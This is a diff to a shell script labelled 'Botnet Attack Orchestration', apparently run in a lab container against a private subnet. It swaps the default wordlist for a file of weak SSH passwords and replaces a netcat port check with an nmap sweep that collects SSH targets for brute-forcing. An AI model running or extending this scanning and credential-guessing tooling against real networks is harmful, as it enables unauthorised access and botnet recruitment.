@@ -7,7 +7,7 @@
 
 TARGET_NETWORK="${TARGET_NETWORK:-192.168.200.0/24}"
 SSH_USER="${SSH_USER:-root}"
-PASSWORD_LIST="${PASSWORD_LIST:-/usr/share/wordlists/nmap.lst}"
+PASSWORD_LIST="${PASSWORD_LIST:-/app/ssh_weak_passwords.txt}"
 
 echo "[*] ============================================"
 echo "[*] Botnet Attack Orchestration"
@@ -27,17 +27,10 @@ echo "[*] Live hosts found: $LIVE_HOSTS"
 
 # Phase 2: Find SSH-enabled hosts
 echo "[*] Phase 2: Scanning for SSH services..."
-for host in $LIVE_HOSTS; do
-  echo -n "  Checking $host:22..."
-  if nc -z -w 2 $host 22 2>/dev/null; then
-    echo " OPEN"
-    echo "$host" >> /app/results/ssh_targets.txt
-  else
-    echo " closed"
-  fi
-done
+nmap -p 22 --open -oG - $TARGET_NETWORK > /app/results/ssh_scan.txt 2>&1
+grep -oP 'Host: \K[\d.]+' /app/results/ssh_scan.txt > /app/results/ssh_targets.txt
 
-if [ ! -f /app/results/ssh_targets.txt ]; then
+if [ ! -s /app/results/ssh_targets.txt ]; then
   echo "[-] No SSH targets found. Exiting."
   exit 1
 fi
